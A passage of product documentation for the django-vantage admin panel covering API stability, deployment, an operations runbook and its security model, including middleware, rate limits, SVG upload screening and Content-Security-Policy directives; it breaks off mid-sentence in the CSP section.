# API stability and deprecations

Vantage is pre-1.0, but "pre-1.0" is not a licence to rename things under you. This
page is the contract: what is frozen, what may still move, how a change is announced,
and the command that finds every affected line in your project before you upgrade.

## What is public

The public API is:

- every name in `vantage.__all__` (`ModelPanel`, `register`, `site`, `VantageSite`,
  `Stat`, `Chart`, `Dashboard`, `Page`, the layout nodes, the inlines and `action`);
- every **declarative `ModelPanel` attribute** and every `get_*` / `has_*_permission`
  hook documented in [Panels](panels.md);
- every key of the **`VANTAGE` setting** documented in the
  [Settings reference](settings.md);
- the management commands, their options and their exit codes;
- the JSON API's URLs, request and response shapes ([The JSON API](api.md));
- the template slot names ([Extending](extending.md)) and the `vantage.plugins`
  entry-point group.

Anything else — a module-level function, a private `_name`, a template's internal
markup, a CSS class — is an implementation detail and can change in any release.

## Stable and provisional

Every setting and every declarative panel attribute is classified, in code, in
`vantage.deprecation`:

- **Stable** — shipped in a release. Frozen: it is not renamed, removed or given a
  different meaning without going through the deprecation cycle below.
- **Provisional** — added since the last release. It may still change before the
  *next* release; the release after the one that first ships it makes it stable.

The test suite fails when a setting or attribute is added without being classified, so
the public surface cannot grow by accident. `vantage_upgrade_check` reports every
provisional name a project uses (`U008`, informational).

Provisional today: the two-factor (`TWO_FACTOR*`), webhook (`WEBHOOKS*`) and scheduled
report (`REPORTS*`) settings, and the panel attributes `field_permissions`, `history`,
`requires_approval`, `formfield_overrides` and `widgets`.

## The deprecation cycle

1. **Deprecated.** The release that decides to change a stable name keeps the old one
   working, adds it to `vantage.deprecation.DEPRECATED_SETTINGS` or
   `DEPRECATED_PANEL_ATTRIBUTES`, and emits `VantageDeprecationWarning` (a
   `DeprecationWarning` subclass) where it is used. A renamed setting or attribute is
   translated to its new name for the whole period, so nothing breaks.
2. **Announced.** The change is listed under **Deprecated** in the
   [changelog](https://github.com/Pythondeveloper6/django-vantage/blob/main/CHANGELOG.md)
   with its replacement and the version it will be removed in.
3. **Removed** no earlier than **two minor releases later** (before 1.0: `0.3` deprecates,
   `0.5` removes at the earliest; after 1.0: never within a major version). A removed
   panel attribute fails `manage.py check` (`vantage.E020`) rather than being ignored.

Exceptions: a security fix may change behaviour in any release, and says so under
**Security** in the changelog. Database migrations are additive within a minor version.

To make deprecations fail your test suite instead of scrolling past:

```ini
# pytest.ini / pyproject.toml [tool.pytest.ini_options]
filterwarnings =
    error::vantage.deprecation.VantageDeprecationWarning
```

## Checking a project before an upgrade

```console
$ python manage.py vantage_upgrade_check --from 0.2.0a2
django-vantage 0.2.0a2 upgrade check
[error] U001 VANTAGE['SITE_TITEL'] is not a setting this version recognises; the site will refuse to start.
    Did you mean 'SITE_TITLE'?
[info] U008 VANTAGE['WEBHOOKS'] is provisional: it may still change before the next release.
    See docs/api-stability.md.

Upgrading to next:
  - Run `manage.py migrate vantage` (migrations 0016 onwards: ...)
```

Run it after bumping the version in a branch, and in CI on every build. It exits `1`
when it finds anything at or above `--fail-level` (`error` by default).

| Option | Meaning |
|---|---|
| `--from VERSION` | Print the upgrade notes for every release since `VERSION` |
| `--format text\|json` | Human-readable, or one JSON document for tooling |
| `--fail-level info\|warning\|error` | The lowest level that makes the exit status `1` |
| `--database ALIAS` | Whose migration state to check (default `default`) |
| `--skip-database` | Configuration checks only; never connects |

| Code | Level | Meaning |
|---|---|---|
| `U001` | error | A `VANTAGE` key this version does not know — the site would refuse to start |
| `U002` | warning | A deprecated setting, with its replacement and removal version |
| `U003` | warning | A deprecated panel attribute |
| `U004` | error | A removed panel attribute is still set |
| `U005` | error | Vantage migrations not applied to the database |
| `U006` | error | The installed Django is outside the tested range |
| `U007` | error/warning | A panel configuration problem `manage.py check` would report |
| `U008` | info | A provisional setting or attribute is in use |

---

URL: https://pythondeveloper6.github.io/django-vantage/deployment/

# Deployment

[← Index](index.md)

What to check before pointing this at production. Vantage is
[beta](faq.md#how-finished-is-this); read this page as a checklist rather than as
reassurance.

## The short list

```bash
python manage.py check --deploy      # Django's own, first
python manage.py check               # includes Vantage's three checks
python manage.py migrate
python manage.py collectstatic
```

Then open `/admin/_/health/` as a superuser and read it.

## The system page

`/admin/_/health/`, superusers only — the detail is deployment information.

Deliberately a read-only diagnostic rather than a monitoring dashboard. The value is
having the five or six facts you actually check on one page inside the panel, instead of
shelling into a box to find out.

| Probe | Reports |
|---|---|
| Migrations | Every migration applied, or the first five that are not, with a hint |
| Database | Vendor, database name, and the server version where the backend exposes one |
| Cache | The backend class, or a warning if a value written did not read back |
| Background tasks | Celery, RQ, Django Tasks, or none |
| Media storage | `MEDIA_ROOT`, or a warning that logo uploads will fail |
| Debug mode | A warning when `DEBUG` is on |
| Versions | Vantage, Django and Python |

Every probe is defensive: a check that raises reports a failure rather than taking the
page down. A health page that 500s when something is unhealthy is worse than none.

A real run against the demo:

```
[ok  ] Migrations         All applied.
[ok  ] Database           sqlite · /path/to/db.sqlite3
[ok  ] Cache              LocMemCache
[ok  ] Background tasks   Django Tasks configured.
[ok  ] Media storage      /path/to/media
[warn] Debug mode         DEBUG is on.
[info] Versions           Vantage 0.3.0b1 · Django 6.1 · Python 3.13.12
```

## Read-only mode

The single most useful operational switch. Point the panel at production, let people
look, and refuse every write:

```python
VANTAGE = {"READ_ONLY": "Frozen during the data migration. Back at 14:00."}
```

A string doubles as the explanation shown to the user. It refuses exactly `add`,
`change` and `delete`; `view` is unaffected.

Three things to know:

- It is enforced **in the permission layer**, so it covers buttons, bulk actions, the
  create and edit forms, inline cell editing and the CSV importer at once — and any
  write path added later inherits the refusal.
- It is checked **before the superuser bypass**. An exemption for the account most
  likely to be signed in during an incident would make the switch decorative.
- It is editable from the [settings screen](theming.md#the-settings-screen), so an
  operator can freeze the panel without a deploy — and unfreeze it the same way.

```pycon
>>> client.get("/admin/shop/order/").status_code       # a superuser
200
>>> client.get("/admin/shop/order/add/").status_code
403
```

## Static files

Vantage ships its CSS and JavaScript prebuilt under `vantage/static/vantage/`. There is
no Node.js build step, no bundler, and nothing to compile.

```bash
python manage.py collectstatic
```

Serve `STATIC_ROOT` however you normally do. WhiteNoise, a CDN and a plain nginx
`location` block all work; nothing in the panel needs a specific one.

Two things are **not** static files, on purpose:

- **The theme stylesheet is inlined into `<head>`.** The tokens depend on
  `BRAND_COLOR` and `BRAND_RADIUS`, which can change from the settings screen at
  runtime, so a static asset would be stale the moment someone edited them — and wrong
  for any project running more than one brand.
- **The no-flash script is inline and blocking**, in `<head>`, before the stylesheet. A
  deferred script paints light first and then flips.

Both blocks carry a nonce, so a strict `Content-Security-Policy` without
`'unsafe-inline'` works. Add `vantage.security.csp_context` to your template context
processors and generate the policy with Django's `SECURE_CSP` or django-csp;
`vantage.W056` warns if a policy is configured without the context processor. The
exact policy, directive by directive, is in
[Security → Content-Security-Policy](security.md#content-security-policy).

Charts are inline SVG rendered on the server. There is no charting library to load and
nothing fetches data after page load.

## Caching

```python
CACHES = {
    "default": {
        "BACKEND": "django.core.cache.backends.locmem.LocMemCache",
    }
}
```

A working cache is not required, and the panel does not fall over without one. The
system page will warn:

> A value written to the cache did not read back. A dummy or misconfigured backend.
> Faceted counts will not be cached.

The settings row is read once per request and held in the process between requests.
Per-request refresh is what makes a save on the settings screen visible to every worker
rather than only to the one that handled the form, and it keeps the query count of a
page constant rather than "one extra on whichever request happened to be first".

Per-list preferences are cached **per request**: one query answers both the personal
and site-wide rows for one list, however many getters ask. Without that, a page with
six calls to `get_list_display` would pay six queries.

## The facet-count cost model

The thing most likely to make a large list page slow, and the thing most worth
understanding before you switch it on.

**Facet counts are off by default.** They appear only when the URL carries `?_facets`,
or when someone has turned them on for that list from the
[customisation rail](lists.md#the-customisation-rail).

When they are on:

| | Cost |
|---|---|
| All cheap filters, nothing multi-select ticked | **1** aggregate for the whole rail |
| Each *active* multi-select filter | **1** additional aggregate |
| Ceiling | `MAX_FACET_QUERIES = 8`; beyond it, counts are dropped |

Each count is a `Count("pk", filter=Q(...))` folded into a single `.aggregate()` — not
Django's `Q(pk__in=<subquery>)` per choice, which the planner sees as N correlated
subqueries and which is pathological on a large table.

Filters classify themselves and only the cheap ones are counted:

| Never counted | Because |
|---|---|
| Any multi-valued path | a count over a fan-out double-counts rows |
| Numeric range | a continuous range has no options |
| An unindexed date column | each bucket costs a scan of the filtered set |
| A relation with more than 50 options | the aggregate would carry one `CASE WHEN` per row of the related table |

**Practical advice:** index the date columns you filter on. An indexed
`DateField`/`DateTimeField` is counted; an unindexed one renders without counts. That is
the difference between a filter rail that answers instantly and one that scans.

A page that is slow is worse than a page without counts, which is why the ceiling drops
counts entirely rather than trimming them silently.

### Related costs to know about

| Feature | Cost |
|---|---|
| Summary bar | 1 query, whatever the column count. On by default |
| `list_stats` | 1 aggregate per join group, plus 1 shared query for all trends |
| `list_charts` | 1 grouped query each, plus 1 shared span probe |
| Both together | Capped by [the budget](analytics.md#the-budget) — 8 queries by default, and the whole strip defers rather than partially computing |
| Relation filter options | 1 query per relation filter, whether or not counts are on |
| Global search | 1 sliced query per model the user may see |
| List page rows | `select_related` / `prefetch_related` planned from the rendered columns; the query count does not grow with the row count |

## Counting a large table

`COUNT(*)` on Postgres is always a full relation scan under MVCC — roughly 50–200 ms at
one million rows and 0.5–2 s at ten million — and it costs that whether the page is
showing 25 rows or two million. GitLab measured 14,972 ms for an exact count against
1.198 ms for the planner's estimate of the same set, at 1.2% error.

`contrib.admin` goes the other way: `show_full_result_count` defaults on and runs a
*second* count over the whole unfiltered table purely to render "1 result (12,345
total)". Vantage ships no equivalent enabled by default.

Instead, a ladder:

1. **Capped exact count.** At most `LIST_COUNT_CAP` rows (10,000) are counted. Below the
   cap the number is exact and unqualified; at the cap the page says `10,000+`. Correct
   on every backend, correct for every user, and the cost is constant regardless of how
   large the table is.
2. **Planner estimate above the cap**, so a big number reads as a number rather than as
   a ceiling — `EXPLAIN (FORMAT JSON)` for the filtered set, `pg_class.reltuples` for the
   whole table. **Postgres only**, cached for `LIST_ESTIMATE_CACHE_SECONDS`, and rendered
   with a `~` prefix so an approximation can never be mistaken for a count.
3. **Statement timeout** (`LIST_STATEMENT_TIMEOUT_MS`, 10 s), so the filter nobody
   anticipated fails loudly on one request instead of pinning a worker for the length of
   a scan.

Deep pagination switches to keyset paging above `LIST_KEYSET_THRESHOLD` rows of offset.

Two rules run through all of it, and both are worth knowing before you tune the
settings.

**An estimate is a nicety and must never be the thing that 500s the page.** Every
Postgres-only path is guarded on the connection vendor first and wrapped in
`DatabaseError` second, and returns `None` rather than raising. SQLite and MySQL have
neither `reltuples` nor a machine-readable plan, so they take the capped path and
nothing else changes.

**An estimate is whole-table, and a whole-table number told to a row-restricted user is
an information leak.** A support agent scoped to their own twelve tickets must never be
shown "~2,000,000 records". Estimates are gated on whether the user is unrestricted,
and that is answered by comparing the SQL before and after `filter_queryset` rather
than by trusting a flag — so a project that scopes rows gets the capped count and no
estimate, automatically.

Set `LIST_COUNT_ESTIMATES = False` to switch step 2 off entirely and always show
`10,000+`.

Vantage's analytics layer never counts rows at all: its row budget is compared against
an estimate the caller supplies, precisely to avoid this.

## Large bulk actions become background jobs

A bulk action whose estimated cost is above `JOB_THRESHOLD_SECONDS` (2 seconds by
default) is turned into a job: it runs in chunks, reports progress at `/admin/_/jobs/`,
and lists exactly which rows failed. Smaller actions still run in the request.

No queue is required. Vantage uses the first of these it finds: Django Tasks (`TASKS`
naming a real backend), Celery with a broker, or RQ via `django_rq`. With none of them,
the job runs **in the web request** — you still get the job row and the failure report,
but a very large action can hit your gateway timeout. The system page shows which
backend is in use, and says "None configured." when it is the in-process fallback.

For production, configure one of the three, and cap actions you know are heavy:

```python
@action("Reprice", max_rows=5000, bulk_strategy="instances")
def reprice(self, request, queryset):
    ...
```

Details: [Background jobs](lists.md#background-jobs) ·
[settings](settings.md#background-jobs).

## Exports stream; imports are capped

Exports use `StreamingHttpResponse` over `QuerySet.iterator()` in chunks of 2,000, so
they start immediately and do not put the result set in memory. Note that a streaming
response holds a database connection for the duration of the download — worth knowing
if you run with a small connection pool.

Responses carry `Cache-Control: no-store`; nothing downstream should cache a per-user,
permission-scoped extract.

Imports are capped by [`IMPORT_MAX_BYTES` and
`IMPORT_MAX_ROWS`](settings.md#behaviour), 5 MiB and 5,000 rows. The uploaded file is
stashed in a private temporary directory under a random token bound to its uploader,
not in the session and not in storage. Make sure that directory survives between the
preview and the commit request — which means **sticky sessions or a shared filesystem
if you run more than one process**, or the commit will not find the file the preview
validated.

## Media and uploads

The settings screen can upload a logo and a favicon, so `MEDIA_ROOT` and `MEDIA_URL`
must be configured and writable, or those fields fail. The system page warns when
`MEDIA_ROOT` is unset.

Uploads are validated as hostile: five allowed extensions, a 2 MiB ceiling, and SVGs
containing script, inline event handlers, `javascript:` URLs or embedded documents are
**refused** rather than sanitised. Details in
[Theming](theming.md#uploads-are-treated-as-hostile).

An SVG logo is served from the panel's own origin and appears on every screen, so a
`<script>` inside one would run with the session cookie of everyone who uses the panel.
The rejection filter is the first line; **serving media from a separate origin is the
defence in depth it cannot replace**, and is worth doing if your users can upload
branding.

## Permissions to review before launch

- Who is a superuser? Superusers bypass every model permission by default.
- Is `SETTINGS_PERMISSION` left at `None`? That means superusers only, which is the
  right default for a screen that can rebrand the site and switch it to read-only.
- Is `LIST_PREFS_PERMISSION` left at `None`? That means only superusers can change what
  every colleague sees when they open a list.
- Do you need row scoping? If so, implement
  [`filter_queryset`](permissions.md#why-filter_queryset-must-be-bulk), not a loop over
  `has_object_perm`.
- Is impersonation acceptable in your environment? It is available to every superuser,
  cannot target another superuser, is banner-loud, and logs both ends at `warning` level
  to the `vantage.security` logger. Ship those logs somewhere.

## Logging

| Logger | Carries |
|---|---|
| `vantage.security` | Impersonation start and end, at `warning` |
| `vantage.dashboards` | A widget that raised, with a traceback |
| `vantage.filters` | Filter-layer diagnostics |
| `vantage.requests` | Panel requests slower than `SLOW_REQUEST_MS`, with structured fields (needs `vantage.metrics.SlowRequestMiddleware`) |
| `vantage.identity` | A role named in `ROLE_MAPPING` that does not exist |

Metrics for Prometheus are at `_/metrics/` once `VANTAGE["METRICS"]` is on; what to
alert on is in the [operations runbook](runbook.md).

The in-panel [audit log](permissions.md#the-audit-log) is a separate thing: it records
what a person did through the admin, with the actor, and is on by default.

## Multiple panels

`VantageSite` can be instantiated more than once and mounted at more than one URL. Two
things to remember: the `VANTAGE` settings dict is **global**, so both sites share the
branding and the permission resolver; and a panel's `has_<action>_permission` hook is
honoured wherever that model appears, so a second mounted site cannot quietly reopen
what the first one closed.

## See also

- [Settings](settings.md) — every key
- [Accessibility](accessibility.md) — what is guaranteed and what is still broken
- [Permissions](permissions.md) — read-only, impersonation, the audit log
- [Lists](lists.md#the-cost-of-counts) — the facet cost model in full
- [FAQ](faq.md) — what is not built yet

---

URL: https://pythondeveloper6.github.io/django-vantage/runbook/

# Operations runbook

What to do when something is wrong with a deployed panel. Each entry is the shortest
safe path; the linked pages explain why.

## Monitoring

- **Metrics.** Set `VANTAGE["METRICS"] = True` and `VANTAGE["METRICS_TOKEN"]` (from your
  secret store), then scrape `<panel>/_/metrics/` with
  `Authorization: Bearer <token>`. Gauges come from the database, so any worker gives
  the same answer:

    | Metric | Alert when |
    |---|---|
    | `vantage_jobs{status="failed"}` | it increases |
    | `vantage_jobs{status="pending"}` | it stays above zero for longer than a job takes — no worker is running |
    | `vantage_webhook_deliveries{status="failed"}` | it increases — a receiver is down or rejecting signatures |
    | `vantage_webhook_deliveries{status="pending"}` | it grows — `vantage_webhooks` is not being run |
    | `vantage_report_runs{status="failed"}` | it increases — mail is failing |
    | `vantage_change_requests{status="pending"}` | it stays high — approvals are sitting unnoticed |
    | `rate(vantage_process_slow_requests_total[5m])` | sustained; `sum()` across processes |

- **Slow requests.** Add `vantage.metrics.SlowRequestMiddleware` to `MIDDLEWARE`; panel
  requests over `VANTAGE["SLOW_REQUEST_MS"]` (default 1000) are logged to
  `vantage.requests` with `vantage_path`, `vantage_view`, `vantage_ms` and
  `vantage_status` as structured fields.
- **Health page.** Superusers: **System** in the panel — migrations, cache, database,
  task backend.

## Incidents

### Something is changing data that should not be

1. Freeze writes for everyone, superusers included, without a deploy: **Settings →
   Read-only**, or `VANTAGE["READ_ONLY"] = "Frozen while we investigate."`. Reads keep
   working. See [Read-only mode](permissions.md#read-only-mode).
2. Read the [audit log](permissions.md#the-audit-log): filter by actor, model and time.
   Impersonation is recorded under the real person, never the impersonated one.
3. Revoke the account (`is_active = False`) or its roles on the [roles screen](roles.md).
4. Repair individual records from their [History](history.md) page ("restore as of"),
   which saves through the normal form and is itself audited.

### A credential or token was exposed

- Webhook signing secret: rotate it on the webhook's page; receivers must accept the new
  one. See [Webhooks](webhooks.md).
- `METRICS_TOKEN`: change it in the secret store and redeploy; the old one stops working
  immediately.
- A person's second factor: reset it ([Two-factor sign-in](two-factor.md#when-someone-loses-their-phone));
  on the server, `python manage.py vantage_two_factor_reset <username>`.
- Values in [sensitive fields](sensitive-fields.md) are never in the audit log, exports
  or webhook payloads; check who used **Reveal**, which is audited.

### Restoring after a bad deletion

1. Within `UNDO_WINDOW` seconds, the toast's **Undo** restores it.
2. A soft-deleted row is in the model's **Trash**; restore it there.
3. Otherwise restore from a database backup. Undo snapshots are not a backup: they are
   purged once expired (`python manage.py vantage_purge_undo`, safe to run any time).

### Background jobs or webhooks are stuck

- Jobs run on the configured task backend (Django Tasks, Celery or RQ); a growing
  `pending` count means no worker is consuming the queue named by `JOB_QUEUE`.
- Webhook retries are sent by `python manage.py vantage_webhooks`, normally from cron;
  run it by hand to drain the queue.

### After an upgrade

```bash
python manage.py vantage_upgrade_check --from <previous version>
python manage.py migrate vantage
python manage.py check --deploy
```

See [API stability and upgrades](api-stability.md). To roll back, deploy the previous
version and migrate `vantage` back to the migration that version shipped with before
starting it.

---

URL: https://pythondeveloper6.github.io/django-vantage/security/

# Security

[← Index](index.md)

Everything on this page is **opt-in**, and that is a deliberate property, not an
oversight: a project that installs neither of the two middlewares described here is
byte-for-byte unchanged by their existence. The alternative — turning protections on by
default inside a library — means a project cannot tell what is guarding it without
reading the source, and a middleware that changes behaviour on upgrade is the kind of
surprise a security feature should never cause.

`manage.py check --deploy` is how you find out what you have not turned on. Read this
page once, wire the two middlewares if you want them, then let the checks hold you to
it on every deploy from then on.

## Threat model

What the panel protects, from whom, and where the lines are. Read it as the statement
of what a security report is measured against.

### Assets

- **Records** in every registered model, and the row-level and tenant scoping that
  decides which of them a person may see or change.
- **Sensitive and hidden field values** — secrets masked by
  [sensitive-field inference](sensitive-fields.md), and fields a role may not see under
  [field permissions](field-permissions.md).
- **Access control itself** — roles, their permissions and field rules, two-factor
  enrolment and recovery codes, the impersonation session, and read-only mode.
- **The audit log**, which must name the person who really acted.
- **Webhook signing secrets**, report unsubscribe tokens and undo tokens.
- **The panel's origin**: anything that runs script there runs with the reader's
  session, frequently a superuser's.

### Actors

| Actor | Trusted with | Must not be able to |
|---|---|---|
| Anonymous visitor | the sign-in page, a signed report-unsubscribe link | reach any panel page, learn whether an account exists, brute-force a password or a second factor |
| Staff with partial permissions | exactly the model, row, tenant and field permissions they hold | read or write past any of them through any surface: list, detail, forms, child formsets, bulk actions and background jobs, import, export, reports, dashboards, autocomplete, search, the JSON API, history, undo, approvals |
| Role manager (`ROLES_PERMISSION` widened) | granting what they hold themselves to *other people* | grant a permission or lift a field rule they do not hold, change a role they are a member of, or add or remove themselves |
| Approver | deciding other people's requests within their own scope | approve their own request, or one outside their row or tenant scope |
| Superuser | everything, by design — including impersonation | impersonate another superuser, act without a trace in the audit log |
| API script (session or token) | what its account holds, same rules as a person | exceed page-size caps or write a field the form would refuse |
| Plugin and panel authors | running code in-process; they are trusted | — their code is not sandboxed. Field permissions do not reach method columns, custom templates, slots or `save_model` |
| Webhook receiver | the payload for events it subscribed to | make the server connect to a private, loopback or link-local address, through redirects, proxies or DNS answers that change between check and connect |

### Trust boundaries

1. **The browser to the panel.** Every view is behind authentication and `is_staff`,
   every state change is a CSRF-protected `POST`, every `next=` is checked to stay on
   the site, and every value rendered is escaped. Uploads are screened at the field and
   (with the middleware) at the request; active content is refused unless a project
   opts in — see [Active content uploads](#active-content-uploads).
2. **The panel to the database.** User input never becomes an identifier: sort keys and
   filters are allow-listed against declared columns, aggregate aliases are positional,
   and the only raw SQL is parameterised. Every queryset passes through the permission
   resolver's `filter_queryset`, which is where tenant scoping is composed.
3. **The request to a background job.** A job stores a query string, never row ids
   for a select-all; it re-resolves the rows through the list page's own code as the
   actor, re-checking the actor's account, permission and tenant before every chunk.
4. **The panel to the network.** Webhooks only, through a client that pins the checked
   address, follows no redirect and no proxy, and has a total deadline.
5. **Configuration.** Settings that would weaken a control (two-factor requirements,
   permission resolvers, field rules in code) are code-only, never editable from the
   settings screen.

### Out of scope

Anything a superuser can already do, `DEBUG = True`, a deliberately granted
permission, and the behaviour of code the project itself registers. See
[SECURITY.md](https://github.com/Pythondeveloper6/django-vantage/blob/main/SECURITY.md)
for how to report a finding.

## What Vantage does automatically, and what it does not

Two things are always on, whatever your `MIDDLEWARE` list says:

- **CSP nonce plumbing**, if you wire the context processor (below) — the panel's own
  two unavoidable inline blocks (the theme-token stylesheet and the no-flash script)
  can be nonced, so a strict policy does not have to blanket-allow inline content.
- **Upload sniffing at the field level**, on every `FileField`/`ImageField` form —
  content is checked against what the extension claims, not trusted from it. See
  [Media and uploads](forms.md#media-and-uploads).

Two things exist but require a line in `MIDDLEWARE` to do anything:

- **`vantage.middleware.LoginThrottleMiddleware`** — rate-limits sign-in attempts.
- **`vantage.middleware.PanelSecurityMiddleware`** — response headers, per-account rate
  limits on autocomplete/export/import, and upload screening at the request level.

And one thing Vantage never does for you: **it does not set a
`Content-Security-Policy` header.** That is Django's own setting (or django-csp's), and
writing one is a decision about your project's asset origins that a library should not
make on your behalf. What Vantage supplies is the *shape* the policy needs to take to
avoid breaking the panel, below.

## Installing the middleware

```python
# settings.py
MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "vantage.middleware.LoginThrottleMiddleware",
    "vantage.middleware.PanelSecurityMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
]
```

Both must come **after** `AuthenticationMiddleware`, because `PanelSecurityMiddleware`
keys its per-surface budgets on `request.user` and `LoginThrottleMiddleware` needs the
auth signals connected. Both must come after `CsrfViewMiddleware`, so a forged POST is
refused before either one spends any effort on it.

Neither middleware is enabled in the demo project (`example/config/settings.py`) —
deliberately: the example is written to be read, not to be a production template, and
that gap is exactly what `check_deploy_login_throttle` (`vantage.W057`) and
`check_deploy_panel_middleware` (`vantage.W058`) exist to flag. Running
`manage.py check --deploy` against the demo as it ships reports both.

### `LoginThrottleMiddleware`

Rate-limits by **username *and* IP together** — never either alone. Username-only
locks out a real user the moment someone else mistypes their password; IP-only is
trivially defeated by a botnet and trivially triggered by an office NAT. Two people
using the same address get separate budgets; a script cycling through addresses to
attack one account still meets that account's budget.

It works through `process_view`, matched against the resolved view class rather than a
URL, so it protects *any* login view in the project — Vantage's own or
`django.contrib.auth`'s — with one line.

A blocked attempt never reaches the view: no query, no password hash. The refusal is:

```
429 Too Many Requests
Retry-After: 187
Cache-Control: no-store

Too many sign-in attempts. Wait a few minutes and try again.
```

The body and status are **byte-identical for a real account and a nonexistent one** —
timing and content both refuse to confirm which. Counts come from Django's own
`user_login_failed` / `user_logged_in` signals, not from guessing at a status code, and
a successful sign-in clears the counter.

| `VANTAGE` key | Default | Effect |
|---|---|---|
| `LOGIN_THROTTLE` | `True` | The kill switch, once the middleware is installed — turn counting off without unwiring anything |
| `LOGIN_THROTTLE_LIMIT` | `10` | Failures allowed per (username, IP) inside the window |
| `LOGIN_THROTTLE_WINDOW` | `300` | Seconds — both the counting window and the lockout duration |
| `LOGIN_THROTTLE_CACHE` | `"default"` | Cache alias the counters live in |
| `LOGIN_THROTTLE_IP_HEADER` | `None` | e.g. `"HTTP_X_FORWARDED_FOR"`. `None` means `REMOTE_ADDR` only — set this only once you know your proxy sets *and overwrites* it, or a client can forge the header it is trusted to read |

These four keys are read from `vantage.security.DEFAULTS`, not `vantage.conf.DEFAULTS`
— see [a settings-layer note](#two-settings-layers) below before you reach for
`vantage.conf.vantage_settings` to read one.

### `PanelSecurityMiddleware`

Scoped strictly to panel URLs — it never touches a route outside `vantage:`. Three jobs:

**Response headers**, on every panel response:

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-Robots-Tag: noindex, nofollow
```

plus Django's own never-cache headers. `check_deploy_panel_middleware`
(`vantage.W058`) says plainly that Django's `XFrameOptionsMiddleware` — which most
projects already have, defaulting to `SAMEORIGIN` — is not a substitute: an admin
panel should refuse framing altogether, not merely same-origin framing.

**Per-account rate limits** on the three surfaces expensive enough to matter — a
script that only ever talks to itself has no shared IP to punish it, so these are keyed
on the signed-in account, never the address:

| Surface | Default budget | Why that number |
|---|---|---|
| `autocomplete` | 120 requests / 60s | Two per second sustained. A debounced typeahead makes roughly one request per word typed; a script paging a table makes thousands |
| `export` | 12 requests / 300s | An export holds a database connection open for the whole download; a dozen concurrent ones is a capacity incident |
| `import` | 10 requests / 300s | Every attempt parses an attacker-supplied file; the wizard is four requests per real import, so ten is "two imports and a mistake" |
| `reveal` | 30 requests / 300s | One sensitive value per request. Enforced by the reveal view itself, so it holds even without this middleware — see [Sensitive fields](sensitive-fields.md#revealing-a-value) |

A refusal is `429` with `Retry-After` and `Cache-Control: no-store` — JSON for
autocomplete (`{"results": [], "more": false, "error": "..."}`, so a client's existing
error branch renders it), plain text elsewhere.

**Upload screening**, on any panel `POST`/`PUT`/`PATCH` carrying a multipart body: every
entry in `request.FILES` is inspected — size against the ceiling, declared content
type against sniffed bytes, and an SVG containing a script, an event handler, a
`javascript:` URL or an embedded document is refused outright. A mismatch answers
`400` naming exactly what was wrong, before the request reaches a view. See
[Media and uploads](forms.md#media-and-uploads) for the field-level half of this that
runs whether or not the middleware is installed.

> **All three layers screen SVG, as of the fix below.** The hazard scan quoted
> above — `<script>`, an event handler, `javascript:`, an embedded document — runs in
> this middleware, in `vantage.models.validate_branding_upload` (the four branding
> fields), and now in `vantage.media.validate_file_upload`, the field-level validator
> every plain `FileField` on a registered model gets. `ImageField` was never exposed:
> it refuses SVG outright, because the only safe way to render an untrusted one is
> not to.
>
> It was not always so. `validate_file_upload` used to check only the sniffed content
> type against the extension, so a file honestly named `.svg` that honestly *was* an
> SVG — script included — passed. Since `partials/thumb.html` links straight to the
> stored file, the next person to open that attachment ran the script from the panel's
> own origin with their own session, which on an admin panel is frequently a
> superuser. Confirmed by calling the validator directly before the fix.
>
> The patterns come from `vantage.security.SVG_HAZARDS` rather than being restated in
> the media layer: there were already two copies of that list, and a third would be a
> third thing to update the next time somebody finds a new way to smuggle script into
> an SVG. See `tests/test_security.py::TestFileFieldSvgScreening`.
>
> A separate `MEDIA_URL` origin (below) remains the defence in depth none of this
> replaces.

| `VANTAGE` key | Default | Effect |
|---|---|---|
| `RATE_LIMIT` | `True` | The kill switch, once the middleware is installed — headers stay on, counting stops |
| `RATE_LIMIT_CACHE` | `"default"` | Cache alias for the counters |
| `RATE_LIMITS` | `None` | Overrides the table above. **Merges** over the defaults rather than replacing them, so setting one surface's budget does not silently remove the other two |
| `UPLOAD_MAX_BYTES` | `10485760` (10 MiB) | Per-file ceiling on anything in `request.FILES`. Generous on purpose — the point is that a ceiling exists, not that it is tight |

### Two settings layers

`LOGIN_THROTTLE*`, `RATE_LIMIT*` and `UPLOAD_MAX_BYTES` are ordinary `VANTAGE` keys —
registered in `vantage.conf.DEFAULTS` and listed in
[Settings](settings.md#the-complete-list) like every other — but their defaults live in
`vantage.security.DEFAULTS`, next to the reasoning for each number. In `vantage.conf`
they are registered as `None`, meaning "no opinion here".

Two things follow. Reading one through `vantage.conf.vantage_settings` returns what you
set, or `None` when you set nothing — not the effective value. And the security layer
reads them from the raw `VANTAGE` dict rather than through `vantage_settings`, so the
login throttle never puts a database read (the settings screen's overrides) behind a
request it is trying to answer cheaply. None of them is editable from the settings
screen for the same reason.

## Content-Security-Policy

Vantage never sets this header. What it guarantees is that the panel can run under a
**strict** policy — no `'unsafe-inline'` blanket allowance — provided the policy
matches what the templates actually emit. `vantage.security.CSP_DIRECTIVES` is the
authoritative statement of that shape, reproduced here directive for directive so the
two cannot drift:

| Directive | Value, and why |
|---|---|
| `default-src` | `'self'` — every fetch the panel makes is same-origin. |
| `script-src` | `'self'` plus a nonce. One inline script (the no-flash theme stamp) and the panel's own static bundle. No CDN, no eval, no inline handlers. |
| `style-src` | `'self'` plus a nonce. One inline style block (the theme tokens) and the panel's own stylesheets. |
| `img-src` | `'self' data:` — `data:` because uploaded branding may be inlined and because the empty-state marks are data URIs. Add your media host if it is separate. |
| `font-src` | `'self'` — the panel ships no webfont and loads none. |
| `connect-src` | `'self'` — autocomplete and inline editing are same-origin fetches. |
| `frame-ancestors` | `'none'` — nothing in an admin panel should ever be framed. |
| `form-action` | `'self'` — every form in the panel posts back to the panel. |
| `base-uri` | `'none'` — the panel emits no `<base>`, and one injected would be a hijack. |
| `object-src` | `'none'` — no plugin content, ever. |

### Wiring the nonce

A nonce protects `<script>` and `<style>` **elements**. Add the context processor so
`base.html` can nonce its own two:

```python
# settings.py
TEMPLATES = [
    {
        ...,
        "OPTIONS": {
            "context_processors": [
                ...,
                "vantage.security.csp_context",
            ],
        },
    },
]
```

That publishes `csp_nonce_attr` in every template's context — deliberately not
